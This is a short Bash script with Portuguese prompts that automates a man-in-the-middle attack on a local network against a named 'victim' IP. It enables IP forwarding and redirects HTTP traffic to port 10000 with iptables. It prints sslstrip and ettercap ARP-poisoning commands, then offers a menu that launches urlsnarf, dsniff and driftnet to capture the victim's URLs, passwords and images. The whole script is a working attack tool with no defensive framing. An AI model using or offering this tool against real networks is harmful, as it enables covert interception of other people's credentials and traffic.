#!/bin/bash
echo "IP DO ROTEADOR: "
read ipro
echo "IP DA VITIMA: "
read ipvi
echo " Sua interface de rede: "
read wireless
if [ "$wireless" = "EU" ];then
ipro=192.168.01
ipvi=192.168.0.108
wireless=wlan0
fi
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo
clear
echo
echo "Abra um terminal e escreva:"
echo
echo " sslstrip 10000"
echo
echo "ettercap -T -q -i "$wireless" -M arp:remote //"$ipro"// //"$ipvi"//"
echo
echo
num=0
while [ "$num" != "4" ]
do
echo
echo "URLsnarf [1]"
echo  "dsniff [2]"
echo   "driftnet [3]"
echo "Sair [4]"
echo
echo
read -p "[+}>>" num

if  [ "$num" = "1" ];then
qterminal -e urlsnarf -i "$wireless"
fi

if  [ "$num" = "2" ];then
qterminal -e dsniff -i "$wireless"
fi

if  [ "$num" = "3" ];then
qterminal -e driftnet -i "$wireless"
fi


if [ "$num" = "4" ];then

iptables -t nat -A PREROUTING -p tcp --destination-port 10000 -j REDIRECT --to-port 80

fi
done

